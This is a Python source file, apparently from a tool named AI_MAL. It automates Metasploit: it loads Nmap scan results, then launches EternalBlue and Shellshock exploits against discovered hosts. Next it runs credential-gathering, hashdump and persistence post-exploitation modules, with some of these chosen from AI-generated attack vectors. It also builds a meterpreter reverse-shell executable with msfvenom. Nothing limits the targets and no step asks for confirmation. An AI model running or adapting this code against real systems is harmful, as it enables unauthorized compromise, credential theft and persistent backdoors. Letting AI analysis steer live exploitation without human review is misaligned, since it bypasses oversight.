"""Metasploit integration manager for AI_MAL."""

import os
import json
import asyncio
import subprocess
from typing import Dict, List, Optional
from pathlib import Path

class MetasploitManager:
    """Manages Metasploit integration and automation."""
    
    def __init__(self, workspace: str):
        """Initialize Metasploit manager.
        
        Args:
            workspace: Name of the Metasploit workspace to use
        """
        self.workspace = workspace
        self.resource_dir = Path("msf_resources")
        self.resource_dir.mkdir(exist_ok=True)
        
    async def setup_workspace(self, scan_results: Dict) -> None:
        """Set up Metasploit workspace with scan results.
        
        Args:
            scan_results: Results from Nmap scan
        """
        resource_script = self.resource_dir / f"{self.workspace}_setup.rc"
        
        with open(resource_script, 'w') as f:
            f.write(f"workspace -a {self.workspace}\n")
            f.write(f"workspace -s {self.workspace}\n")
            
            # Import hosts from scan results
            for host in scan_results.get('hosts', []):
                ip = host.get('ip')
                if ip:
                    f.write(f"hosts -a {ip}\n")
                    
                    # Add host details
                    if 'os' in host:
                        f.write(f"hosts -s {ip} -o {host['os']}\n")
                    if 'hostname' in host:
                        f.write(f"hosts -s {ip} -n {host['hostname']}\n")
                        
                    # Add services
                    for service in host.get('services', []):
                        port = service.get('port')
                        name = service.get('name')
                        if port and name:
                            f.write(f"services -a {ip} -p {port} -n {name}\n")
                            
                            # Add service details
                            if 'version' in service:
                                f.write(f"services -s {ip} -p {port} -v {service['version']}\n")
                            if 'state' in service:
                                f.write(f"services -s {ip} -p {port} -s {service['state']}\n")
        
        # Execute resource script
        await self._run_msf_console(resource_script)
        
    async def run_exploits(self, scan_results: Dict) -> None:
        """Run appropriate exploits based on scan results.
        
        Args:
            scan_results: Results from Nmap scan
        """
        resource_script = self.resource_dir / f"{self.workspace}_exploits.rc"
        
        with open(resource_script, 'w') as f:
            f.write(f"workspace -s {self.workspace}\n")
            
            # Run exploits for each host
            for host in scan_results.get('hosts', []):
                ip = host.get('ip')
                if not ip:
                    continue
                    
                # Add exploits based on services
                for service in host.get('services', []):
                    port = service.get('port')
                    name = service.get('name')
                    version = service.get('version')
                    
                    if not all([port, name]):
                        continue
                        
                    # Add appropriate exploits based on service
                    if name == 'smb' and version:
                        f.write(f"use exploit/windows/smb/ms17_010_eternalblue\n")
                        f.write(f"set RHOSTS {ip}\n")
                        f.write("run\n")
                        f.write("back\n")
                        
                    elif name == 'http' and 'apache' in version.lower():
                        f.write(f"use exploit/multi/http/apache_mod_cgi_bash_env_exec\n")
                        f.write(f"set RHOSTS {ip}\n")
                        f.write("run\n")
                        f.write("back\n")
                        
                    # Add more service-specific exploits here
        
        # Execute resource script
        await self._run_msf_console(resource_script)
        
    async def generate_and_execute_scripts(self, scan_results: Dict, analysis: Optional[Dict] = None) -> None:
        """Generate and execute Metasploit resource scripts based on scan results and AI analysis.
        
        Args:
            scan_results: Results from Nmap scan
            analysis: Optional AI analysis results
        """
        # Generate setup script
        await self.setup_workspace(scan_results)
        
        # Generate exploit script
        resource_script = self.resource_dir / f"{self.workspace}_auto.rc"
        
        with open(resource_script, 'w') as f:
            f.write(f"workspace -s {self.workspace}\n")
            
            # Add post-exploitation modules based on analysis
            if analysis:
                for vector in analysis.get('attack_vectors', []):
                    if vector.get('type') == 'post_exploitation':
                        f.write(f"use {vector['module']}\n")
                        f.write(f"set RHOSTS {vector['target']}\n")
                        for opt, val in vector.get('options', {}).items():
                            f.write(f"set {opt} {val}\n")
                        f.write("run\n")
                        f.write("back\n")
            
            # Add standard post-exploitation modules
            f.write("use post/windows/gather/credentials\n")
            f.write("run\n")
            f.write("back\n")
            
            f.write("use post/windows/gather/hashdump\n")
            f.write("run\n")
            f.write("back\n")
            
            f.write("use post/windows/manage/persistence\n")
            f.write("run\n")
            f.write("back\n")
        
        # Execute resource script
        await self._run_msf_console(resource_script)
        
    async def _run_msf_console(self, resource_script: Path) -> None:
        """Run Metasploit console with a resource script.
        
        Args:
            resource_script: Path to the resource script
        """
        try:
            cmd = ["msfconsole", "-q", "-r", str(resource_script)]
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode != 0:
                print(f"Error running Metasploit: {stderr.decode()}")
            else:
                print(stdout.decode())
                
        except Exception as e:
            print(f"Error executing Metasploit: {e}")
            
    def generate_payload(self, lhost: str, lport: int, payload_type: str = "windows/meterpreter/reverse_tcp") -> str:
        """Generate a Metasploit payload.
        
        Args:
            lhost: Local host IP
            lport: Local port
            payload_type: Type of payload to generate
            
        Returns:
            Path to the generated payload file
        """
        try:
            output_file = self.resource_dir / f"payload_{lport}.exe"
            
            cmd = [
                "msfvenom",
                "-p", payload_type,
                f"LHOST={lhost}",
                f"LPORT={lport}",
                "-f", "exe",
                "-o", str(output_file)
            ]
            
            subprocess.run(cmd, check=True)
            return str(output_file)
            
        except Exception as e:
            print(f"Error generating payload: {e}")
            return None 